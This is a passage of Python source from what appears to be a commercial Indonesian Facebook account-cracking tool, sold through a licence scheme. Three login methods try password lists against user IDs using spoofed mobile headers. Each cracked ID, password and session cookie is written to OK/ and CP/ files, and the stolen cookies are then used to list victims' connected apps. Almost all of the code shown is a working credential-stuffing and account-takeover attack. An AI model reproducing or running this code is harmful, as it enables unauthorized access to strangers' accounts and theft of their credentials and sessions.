signed_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv6.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df64f8f3de85d3c%26domain%3Did.scribd.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.scribd.com%252Ff1b618b16e20678%26relation%3Dopener%26frame%3Df22193e4bc4edfc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=136494494209&kid_directed_site=0&app_id=136494494209&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D136494494209%26cbt%3D1677604624692%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1768d45e7cf3b8%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%26client_id%3D136494494209%26display%3Dtouch%26domain%3Did.scribd.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.scribd.com%252Fdocument%252F392244848%252FUser-Agent-Android-2019%26locale%3Den_US%26logger_id%3Df3586987545284%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df64f8f3de85d3c%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%2526frame%253Df22193e4bc4edfc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv6.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df64f8f3de85d3c%26domain%3Did.scribd.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.scribd.com%252Ff1b618b16e20678%26relation%3Dopener%26frame%3Df22193e4bc4edfc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?api_key=136494494209&auth_token=6d0223efe0da6a775e7ff3172c04245b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D136494494209%26cbt%3D1677604624692%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1768d45e7cf3b8%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%26client_id%3D136494494209%26display%3Dtouch%26domain%3Did.scribd.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.scribd.com%252Fdocument%252F392244848%252FUser-Agent-Android-2019%26locale%3Den_US%26logger_id%3Df3586987545284%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df64f8f3de85d3c%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%2526frame%253Df22193e4bc4edfc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv6.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=136494494209&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df64f8f3de85d3c%26domain%3Did.scribd.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.scribd.com%252Ff1b618b16e20678%26relation%3Dopener%26frame%3Df22193e4bc4edfc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

#--------------------[ METODE FREE ]-----------------#
def crackfree(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]free [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/?aaid=bda4ded4-3b82-4a5d-9ab1-108988b560eb&idLimited=false&zmode=free&subno_key=AaHgj2PZnFDYXJIpSsX3gsRQX7MM0g3wLAFndegtLCgTmuf3tFvnBJLhInYs73VtckxnDvlB45Jmr9t37CmsIcZegNsBaOLNgguJ8IDpVkP0CKKe85TRsNKD-q4rpkxxRD2AkKxvgq1-KKoVDQgaUbMhSlKmUvoEb7E8yUBQP9bdPoeCSgFQWM4nTWPMTNiX8Fsm3JSY3yGZbqRkKnq-uJbeWjjthINDeG4xGrrT2P5tqTnEwjadiZKg0KKOkWlpevFd7xZibbLYwnETai7ktrFOaaJ0Vz8qUE1Jh2UoVYcyUdZjdfenhIZlXjCpv1rOUcY&hrc=1&paipv=0&eav=AfZBhhlLDIXIQATiGtzqbUA3NGqLXk8NUaQDafwGce-pcV6oqai6SMCNC5SXG-WIimY&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/?aaid=bda4ded4-3b82-4a5d-9ab1-108988b560eb&idLimited=false&zmode=free&subno_key=AaHgj2PZnFDYXJIpSsX3gsRQX7MM0g3wLAFndegtLCgTmuf3tFvnBJLhInYs73VtckxnDvlB45Jmr9t37CmsIcZegNsBaOLNgguJ8IDpVkP0CKKe85TRsNKD-q4rpkxxRD2AkKxvgq1-KKoVDQgaUbMhSlKmUvoEb7E8yUBQP9bdPoeCSgFQWM4nTWPMTNiX8Fsm3JSY3yGZbqRkKnq-uJbeWjjthINDeG4xGrrT2P5tqTnEwjadiZKg0KKOkWlpevFd7xZibbLYwnETai7ktrFOaaJ0Vz8qUE1Jh2UoVYcyUdZjdfenhIZlXjCpv1rOUcY&hrc=1&paipv=0&eav=AfZBhhlLDIXIQATiGtzqbUA3NGqLXk8NUaQDafwGce-pcV6oqai6SMCNC5SXG-WIimY&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://touch.facebook.com/mobile/lite_error_logs/?log=%7B%22appid%22%3A%22409962623085609%22%2C%22version%22%3A%22345.0.0.0.22%22%2C%22versioncode%22%3A2171%2C%22revision%22%3A%223a0007d2cc46%22%2C%22userid%22%3A%220%22%2C%22msg%22%3A%22%3A%20For%20input%20string%3A%20%5C%22%5C%22%22%2C%22stack%22%3A%22vlb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A111%3A51%5CnElb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A116%3A21%5Cnqrb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A119%3A21%5Cnurb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A2941%3A21%5Cnnew%20Y2c%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A5371%3A41%5CnL0c%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A89%3A155%5Cnf2c%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A5359%3A25%5CnxN%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1419%3A35%5CnqT%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1639%3A189%5CntT%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1641%3A60%5CnSg%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A331%3A137%5CnBNb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A3734%3A547%5CnHNb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A3740%3A571%5CnyNb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A3731%3A542%5CnVB%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1038%3A24%5CnKeb%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A2510%3A55%5Cnbm%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A541%3A90%5CnJS%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1617%3A18%5CnTS%40z-m-static.xx.fbcdn.net%2Frsrc.php%2Fv3%2Fyf%2Fr%2FaezDV_doTWV.js%3F_nc_x%3DbTyV4ls_whV%26_nc_eui2%3DAeFp2trahr5pimIBQipJti2rlg5-TK9Ysv-WDn5Mr1iy_9aKA2e1ENLK3AFpHJ8jp8RnIt9Mkx_8oUQExGUCXJnN%26_nc_wlrcb%3D204%26_nc_rml%3D0%3A1624%3A47%5Cn%22%2C%22soft%22%3Atrue%2C%22source%22%3Anull%2C%22log_id%22%3A805%2C%22lid%22%3A%227204674031301077360%22%7D',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

#--------------------[ METODE-B-API ]-----------------#
def crackapi(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]b-api [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = ugenapi()
	for pw in pwv:
		try:
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": f"{str(random.randint(1,26))}", 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			po = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "User must verify their account" in po.text:
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
	
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
		
kentod = random.choice(["MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])
kentodd=random.choice([kentod])
crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        os.system("clear")
        banner();time.sleep(1)
        print("[+] Authour Asepitgans_Xc\n[+] Status \033[32mNotlisensi\033[0m")
        prints(nel(f'{P2}License Anda Tidak Tersedia Jika Mau Beli Liat Dibawah{P2}',width=80,padding=(0,7),style=f"{color_panel}"));time.sleep(2)
        print('[+] List Harganya :')
        prints(nel(f'{P2}- Open source 500k\n- 1 minggu 30k\n- 2 minggu 60k\n- 1 bulan 100k\n- Permanen 250k enc Full Update{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
        prints(nel(f'{P2}License Anda : {H2}{crot}{P2}',width=80,padding=(0,7),style=f"{color_panel}"));time.sleep(1)
        namamu = input("\033[0m[+] Nama anda :\033[32m ")
        prints(nel(f'{P2}Note : kalau mau beli ketik "{H2}y{P2}" kalau gak mau ketik "{H2}t{P2}" {P2}',width=80,padding=(0,7),style=f"{color_panel}"))
        yt = input("[+] Beli Lisensi : \033[32m")
        if yt in ["Y","y"]:
            prints(nel(f'{P2}Key anda : {H2}{crot} {P2}tunggu sebentar akan diarahkan ke WhatsApp\nNote : {M2} Jika anda sudah di konfirmasi silahkan tunggu 5 menit, setelah 5 menit lalu jalankan ulang scriptnya terimakasih.{P2}',width=80,padding=(0,7),style=f"{color_panel}"));time.sleep(3);os.system("xdg-open https://wa.me/+6289530656600?text=Assalamualaikum+bang+Asepitgans_Xc,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu);exit()
        else:
        	prints(nel(f'{P2}Lisensi telah keluar dari program{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/Asepitgasn-Dev/Lisensi/main/Key.json").json()
    except requests.exceptions.ConnectionError:
    	prints(nel(f'{P2}Jaringan Internet Kamu Tidak Ada{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
        	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=80,padding=(0,7),style=f"{color_panel}"));os.system("rm -rf .key.txt");exit()
        else:
        	prints(nel(f'{P2}Welcome{H2} premium,{P2} Lisensi key Kamu Sudah Aktif{P2}',width=80,padding=(0,7),style=f"{color_panel}"));time.sleep(1);login()
    else:
    	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit();os.system("rm -rf .key.txt");exit()


def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m             ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m             ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
